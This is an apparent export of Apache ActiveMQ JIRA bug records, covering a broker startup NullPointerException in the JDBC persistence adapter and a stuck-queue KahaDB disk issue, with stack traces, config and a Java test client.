jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
jvm 1    | 	... 16 more
jvm 1    | Caused by: java.lang.NullPointerException
jvm 1    | 	at org.apache.activemq.util.ByteSequence.<init>(ByteSequence.java:29)
jvm 1    | 	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getLastMessageBrokerSequenceId(JDBCPersistenceAdapter.java:232)
jvm 1    | 	at org.apache.activemq.store.journal.JournalPersistenceAdapter.getLastMessageBrokerSequenceId(JournalPersistenceAdapter.java:222)
jvm 1    | 	at org.apache.activemq.broker.region.DestinationFactoryImpl.getLastMessageBrokerSequenceId(DestinationFactoryImpl.java:140)
jvm 1    | 	at org.apache.activemq.broker.region.RegionBroker.<init>(RegionBroker.java:106)
jvm 1    | 	at org.apache.activemq.broker.jmx.ManagedRegionBroker.<init>(ManagedRegionBroker.java:94)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1728)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1688)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:706)
jvm 1    | 	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:276)
jvm 1    | 	at org.apache.activemq.store.journal.JournalPersistenceAdapter.start(JournalPersistenceAdapter.java:265)
jvm 1    | 	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:466)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:597)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
jvm 1    | 	... 36 more
wrapper  | <-- Wrapper Stopped
","Linux hostname-removed 2.6.21.7-2.fc8xen #1 SMP Fri Feb 15 12:34:28 EST 2008 x86_64 x86_64 x86_64 GNU/Linux

java version ""1.6.0_21""
Java(TM) SE Runtime Environment (build 1.6.0_21-b06)
Java HotSpot(TM) 64-Bit Server VM (build 17.0-b16, mixed mode)",muellerc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2696,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,69618,,,Thu Jun 30 14:56:26 UTC 2011,,,,,,,,,,,"0|i0tsb3:",171895,,,,,,,,,,,,,,,,,,,,,"13/Apr/11 16:29;muellerc;We running in the same issue. Any updates here?

Env:
apache-activemq-5.3.1-fuse-02-01

We are using the jdbc persistence store (Oracle).
{code}
<persistenceAdapter>
    <jdbcPersistenceAdapter dataSource=""#oracle-ds""/>
</persistenceAdapter>

<bean id=""oracle-ds"" class=""org.apache.commons.dbcp.BasicDataSource"" destroy-method=""close"">
    <property name=""driverClassName"" value=""oracle.jdbc.driver.OracleDriver""/>
    <property name=""url"" value=""jdbc:oracle:thin:@127.0.0.1:1521:SID""/>
    <property name=""username"" value=""user""/>
    <property name=""password"" value=""password""/>
    <property name=""poolPreparedStatements"" value=""true""/>
    <property name=""initialSize"" value=""5""/>
    <property name=""maxActive"" value=""7""/>
    <property name=""minIdle"" value=""2""/>
    <property name=""maxIdle"" value=""5""/>
    <property name=""validationQuery"" value=""SELECT 1 FROM DUAL""/>
    <property name=""testOnBorrow"" value=""true""/>
</bean>
{code}

Thanks in advance,
Christian;;;","13/Apr/11 16:32;muellerc;Our complete stack trace looks like:
{noformat}
ava Runtime: Sun Microsystems Inc. 1.6.0_21 /opt/sia/java/jre1.6.0_21
  Heap sizes: current=203136k  free=199951k  max=699072k
    JVM args: -Xmx768M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dcom.sun.management.jmxremote=true -Dcom.sun.management.jmxremote.port=11119 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=10.51.44.35 -Dactivemq.classpath=/opt/sia/apache-activemq-5.3.1-fuse-02-01/conf; -Dactivemq.home=/opt/sia/apache-activemq-5.3.1-fuse-02-01 -Dactivemq.base=/opt/sia/apache-activemq-5.3.1-fuse-02-01
ACTIVEMQ_HOME: /opt/sia/apache-activemq-5.3.1-fuse-02-01
ACTIVEMQ_BASE: /opt/sia/apache-activemq-5.3.1-fuse-02-01
Loading message broker from: xbean:activemq.xml
INFO | Using Persistence Adapter: JDBCPersistenceAdapter(org.apache.commons.dbcp.BasicDataSource@628f9a32)
INFO | Database adapter driver override recognized for : [oracle_jdbc_driver] - adapter: class org.apache.activemq.store.jdbc.adapter.OracleJDBCAdapter
INFO | Database lock driver override not found for : [oracle_jdbc_driver].  Will use default implementation.
INFO | Attempting to acquire the exclusive lock to become the Master broker
INFO | Becoming the master on dataSource: org.apache.commons.dbcp.BasicDataSource@628f9a32
INFO | ActiveMQ 5.3.1-fuse-02-01 JMS Message Broker (amqcat02) is starting
INFO | For help or more information please see: http://activemq.apache.org/
ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.NullPointerException
java.lang.NullPointerException
        at org.apache.activemq.util.ByteSequence.<init>(ByteSequence.java:29)
        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getLastMessageBrokerSequenceId(JDBCPersistenceAdapter.java:232)
        at org.apache.activemq.broker.region.DestinationFactoryImpl.getLastMessageBrokerSequenceId(DestinationFactoryImpl.java:140)
        at org.apache.activemq.broker.region.RegionBroker.<init>(RegionBroker.java:106)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.<init>(ManagedRegionBroker.java:95)
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1740)
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734)
        at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1694)
        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:712)
        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:276)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
INFO | ActiveMQ Message Broker (amqcat02, null) is shutting down
INFO | Network Connector F_TO_B Stopped
INFO | Connector openwire Stopped
INFO | Connector open2 Stopped
INFO | Connector ssl Stopped
INFO | ActiveMQ JMS Message Broker (amqcat02, null) stopped
ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        ... 10 more
Caused by: java.lang.NullPointerException
        at org.apache.activemq.util.ByteSequence.<init>(ByteSequence.java:29)
        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getLastMessageBrokerSequenceId(JDBCPersistenceAdapter.java:232)
        at org.apache.activemq.broker.region.DestinationFactoryImpl.getLastMessageBrokerSequenceId(DestinationFactoryImpl.java:140)
        at org.apache.activemq.broker.region.RegionBroker.<init>(RegionBroker.java:106)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.<init>(ManagedRegionBroker.java:95)
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1740)
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734)
        at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1694)
        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:712)
        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:276)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
        ... 30 more
ERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:99)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in class path resource [activemq.xml]: Invocation of init method failed; nested exception is java.lang.NullPointerException
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(Native Method)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        ... 10 more
Caused by: java.lang.NullPointerException
        at org.apache.activemq.util.ByteSequence.<init>(ByteSequence.java:29)
        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getLastMessageBrokerSequenceId(JDBCPersistenceAdapter.java:232)
        at org.apache.activemq.broker.region.DestinationFactoryImpl.getLastMessageBrokerSequenceId(DestinationFactoryImpl.java:140)
        at org.apache.activemq.broker.region.RegionBroker.<init>(RegionBroker.java:106)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.<init>(ManagedRegionBroker.java:95)
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1740)
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734)
        at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1694)
        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:712)
        at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.start(JDBCPersistenceAdapter.java:276)
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469)
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
        ... 30 more

{noformat};;;","13/Apr/11 20:29;muellerc;I think the problem is related to this piece of code. The call to ""getAdapter().doGetLastMessageStoreSequenceId(c)"" returns the ""Math.max(lastSequenceIdInMsg, lastSequenceIdInAcks)"". In the case the broker was not shut down right, the sequenceId from lastSequenceIdInAcks is higher than the lastSequenceIdInMsg. But the JDBCPersistenceAdapter does not care about this and try to load the message with this id and fails with a NPE.

{code:title=org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.java}
    public long getLastMessageBrokerSequenceId() throws IOException {
        // Get a connection and insert the message into the DB.
        TransactionContext c = getTransactionContext();
        try {
            long seq =  getAdapter().doGetLastMessageStoreSequenceId(c);
            sequenceGenerator.setLastSequenceId(seq);
            long brokerSeq = 0;
            if (seq != 0) {
            	Message last = (Message)wireFormat.unmarshal(new ByteSequence(getAdapter().doGetMessageById(c, seq)));
            	brokerSeq = last.getMessageId().getBrokerSequenceId();
            }
            return brokerSeq;
        } catch (SQLException e) {
            JDBCPersistenceAdapter.log(""JDBC Failure: "", e);
            throw IOExceptionSupport.create(""Failed to get last broker message id: "" + e, e);
        } finally {
            c.close();
        }
    }
{code}

If someone could tell me what the right behavior is, I could provide a patch for this issue...

Christian;;;","14/Apr/11 09:03;gtully;Hmm, that is a problem, i think the message corresponding to the seqId from the acks may not be in the store because it could already have been removed.
I think the brokerSeq should be set to the 'seq' in that case as a fallback.

On trunk there is a null check but brokerSeq defaults to 0, which means that ids will be reused, in a failover message producer this could lead to duplicates.

I think trunk needs to default the brokerSeq to the seq value returned from the store.

fyi: the root problem is that the brokerSeq, incremented when a messages is received cannot be used as the orderId/seqId in the store because they values get out of sync when transactions are used, commits may be out of order w.r.t to initial sends. For that reason, the next brokerSeq needs to be derived from what is stored on a restart.
In the case that the value comes from what is acked and the message is no longer available, using the value from the ack table as the new value makes sense.
;;;","17/May/11 21:27;muellerc;I think this issue is solved. The code in trunk is:

{code:title=org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.java}
    public long getLastMessageBrokerSequenceId() throws IOException {
        TransactionContext c = getTransactionContext();
        try {
            long seq =  getAdapter().doGetLastMessageStoreSequenceId(c);
            sequenceGenerator.setLastSequenceId(seq);
            long brokerSeq = 0;
            if (seq != 0) {
                byte[] msg = getAdapter().doGetMessageById(c, seq);
                if (msg != null) {
                    Message last = (Message)wireFormat.unmarshal(new ByteSequence(msg));
                    brokerSeq = last.getMessageId().getBrokerSequenceId();
                } else {
                   LOG.warn(""Broker sequence id wasn't recovered properly, possible duplicates!"");
                }
            }
            return brokerSeq;
        } catch (SQLException e) {
            JDBCPersistenceAdapter.log(""JDBC Failure: "", e);
            throw IOExceptionSupport.create(""Failed to get last broker message id: "" + e, e);
        } finally {
            c.close();
        }
    }
{code}

So it's no longer possible to get the NPE by creating the ByteSequence. This issue is a duplicate to [AMQ-2696|https://issues.apache.org/jira/browse/AMQ-2696] which is already solved and can be closed.;;;","30/Jun/11 14:56;tabish;Issue ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Message getting stuck on queue, leading to KahaDB log files not being deleted and disk running out of space",AMQ-2955,12483849,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,pblackburn,pblackburn,01/Oct/10 16:46,19/Apr/11 12:49,14/Jul/23 05:43,19/Apr/11 12:49,5.4.1,,,,,5.5.0,,,Message Store,,,,3,,,,,,,,,"Using the following test client, we see a single message getting stuck on the queue. This then prevents the KahaDB files from being cleaned up. Once this message gets stuck, we need to restart the broker before it can be consumed. This is a total show stopper for us, as when this occurs in our system the large number of messages that we produce and consume each second causes the disk to run out of space within the space of an hour. We also see the same behaviour using synchronous sending and without failover.

This doesn't happen every time with the test client - the most reliable way I have found to reproduce it is to start the broker and wait for the first MessageDatabase checkpoint to finish before starting the test client. 

{code:title=Test Client}
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.Random;

import javax.jms.Connection;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.MessageProducer;
import javax.jms.Queue;
import javax.jms.Session;
import javax.jms.ConnectionFactory;

import org.apache.activemq.ActiveMQConnectionFactory;

public class Test {
        public static final void main(String[] args) throws Exception {
                ConnectionFactory cf = new ActiveMQConnectionFactory(""failover:(tcp://localhost:61616)?jms.useAsyncSend=true&trackMessages=true"");
                final Connection producerConn = cf.createConnection();
                final Connection consumerConn = cf.createConnection();

                final BufferedWriter producerLog = new BufferedWriter(new FileWriter(""produced.log""));
                final BufferedWriter consumerLog = new BufferedWriter(new FileWriter(""consumed.log""));

                new Thread(new Runnable() {
                        public void run() {
                                try {
                                        producerConn.start();
                                        Session session = producerConn.createSession(false, Session.CLIENT_ACKNOWLEDGE);
                                        Queue queue = session.createQueue(""TEST_QUEUE"");
                                        MessageProducer producer = session.createProducer(queue);
                                        Random random = new Random();
                                        byte[] messageBytes = new byte[1024];

                                        for (int i = 0; i < 100000; i++) {
                                        //while (true) {
                                                random.nextBytes(messageBytes);
                                                Message message = session.createObjectMessage(messageBytes);
                                                producer.send(message);
                                                producerLog.write(message.getJMSMessageID());
                                                producerLog.newLine();
                                                producerLog.flush();
                                        }
                                        System.out.println(""Produced 100000 messages..."");
                                        producerLog.close();
                                }
                                catch (Exception e) {
                                        e.printStackTrace();
                                }
                        }
                }).start();

                System.out.println(""Started producer..."");

                new Thread(new Runnable() {
                        public void run() {
                                try {
                                        consumerConn.start();
                                        Session session = consumerConn.createSession(false, Session.CLIENT_ACKNOWLEDGE);
                                        Queue queue = session.createQueue(""TEST_QUEUE"");
                                        MessageConsumer consumer = session.createConsumer(queue);
                                        consumer.setMessageListener(new MessageListener() {
                                                public void onMessage(Message message) {
                                                        try {
                                                                message.acknowledge();
                                                                consumerLog.write(message.getJMSMessageID());
                                                                consumerLog.newLine();
                                                                consumerLog.flush();
                                                        }
                                                        catch (Exception e) {
                                                                e.printStackTrace();
                                                        }
                                                }
                                        });
                                }
                                catch (Exception e) {
                                        e.printStackTrace();
                                }
                        }
                }).start();

                System.out.println(""Started consumer..."");
        }
}
{code}

After the 100,000 messages have been produced, we can see the following difference in the log files:

{noformat}
[pblackburn@xxxx test]$ diff produced.log consumed.log
10394d10393
< ID:xxxx-35451-1285948546531-0:0:1:1:10394
[pblackburn@xxxx test]$
{noformat}

Looking in the activemq log file, at around this point we see:

{noformat}
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 349, enqueueSize: 10390
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 350, enqueueSize: 10391
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 351, enqueueSize: 10392
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 352, enqueueSize: 10393
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 70% of available memory, to: 69% of available memory
2010-10-01 15:55:51 AbstractStoreCursor [DEBUG] TEST_QUEUE disabling cache on size:0, lastCachedIdSeq: 10398 current node seqId: 10399
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory
